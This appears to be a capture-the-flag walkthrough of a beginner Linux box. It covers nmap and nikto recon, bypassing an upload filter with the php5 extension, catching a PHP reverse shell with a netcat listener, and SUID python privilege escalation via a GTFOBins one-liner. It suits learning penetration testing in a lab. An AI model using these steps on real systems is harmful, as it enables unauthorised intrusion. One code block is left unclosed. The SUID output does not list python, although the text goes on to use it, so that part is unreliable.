This is meant to be a basic machine which gets you started with the methodology / process of pwning a box.

## Recon & Enumeration

Let‚Äôs begin our initial recon with `nmap` ...

```python
root@ip-10-10-45-183:~# nmap -sS 10.10.9.126 -Pn

Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-02 19:02 GMT
Nmap scan report for ip-10-10-9-126.eu-west-1.compute.internal (10.10.9.126)
Host is up (0.020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:71:DB:E8:12:BD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```

Let‚Äôs run `nmap` with some more switches & `nikto` and take a look at the http website being served.

```python
root@ip-10-10-45-183:~# nmap -sC -sV 10.10.9.126 -Pn

Navigating to the website we see the following

<img src = "https://cdn.hashnode.com/res/hashnode/image/upload/v1705614020436/ca9f1599-47c4-4846-94cb-76d39cfa4533.png" width = 300 height = 200> <br>

Reviewing the `nikto` results, let‚Äôs navigate to the newly discovered directory.

We are greeted with an upload form...(\*laughs in evil\*)

<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1705614135646/ba53492d-917e-4179-8330-58576428cc2d.png" width=600 height=350> <br>

As mentioned earlier this is a very basic box meant to walk you through the typical process for exploiting a linux system with **common vulnerabilities** and **known exploits**.

Uploading a PHP reverse shell from pentest monkey (Can‚Äôt believe it‚Äôs from 2007‚Ä¶..yikes I'm old) - [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Use your favorite text editor (`nano` for me) to swap out the `IP` and `Port` with your own attacking machine details and spawn a netcat shell on your attacking machine like this.

```bash
nc -nvlp 4444
```

Once uploaded, we notice the response ‚ÄúPHP not permitted‚Äù. Let‚Äôs inspect the HTTP requests to get a better idea of what happening (Burp to the rescue). Upon inspection, looks like we need to simply bypass the filename filter...

Let‚Äôs rename the file to `shell.php%00` and we see it uploads and it does! We get a success message, looking at the response we can see the location where our `php` file is stored. Let‚Äôs navigate to it..

<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1705614453165/b54b8051-b7cd-4967-80bd-26423a7461bd.png" width=500 height=250> <br> 

Clicking on our uploaded shell throws an error (uh oh...) let's dive into it.

Seems like the null character in the URL is causing some issues. Trying a few more popular `php` extension filter bypasses we see that we can upload `php5` extensions with ease and we have a reverse shell!

```bash
root@ip-10-10-45-183:~# nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.9.126 55210 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:33:41 up 33 min,  0 users,  load average: 0.00, 0.00, 0.05

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Now, put your thinking cap on and think of common locations to find the `user.txt` and it's right there.

## Privilege Escalation

Let‚Äôs run the following to see any SUID files. I know I know we can use `linpeas` and other scripts but hey you do you!

```bash
find / -perm -u=s -type f 2>/dev/null
```

*Output:*

```bash

/bin/fusermount
/bin/ping
/bin/umount
```

`/usr/bin/python` seems like the one that sticks out and we should look into, let‚Äôs go to our [GTFOBins Repository](https://gtfobins.github.io/gtfobins/python/)

Reading from the **SUID** section, we run the following (explanation below)

```bash
sudo install -m =xs $(which python) .
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

üí° 
*If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges. This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.*
 <br>

Once run, we will see a new root shell and we can navigate to `/root/root.txt` to get our flag.

Overall, boxes such as this one are a good starting point to get exposed to typical exploitation and I highly recommend it if you're starting out.
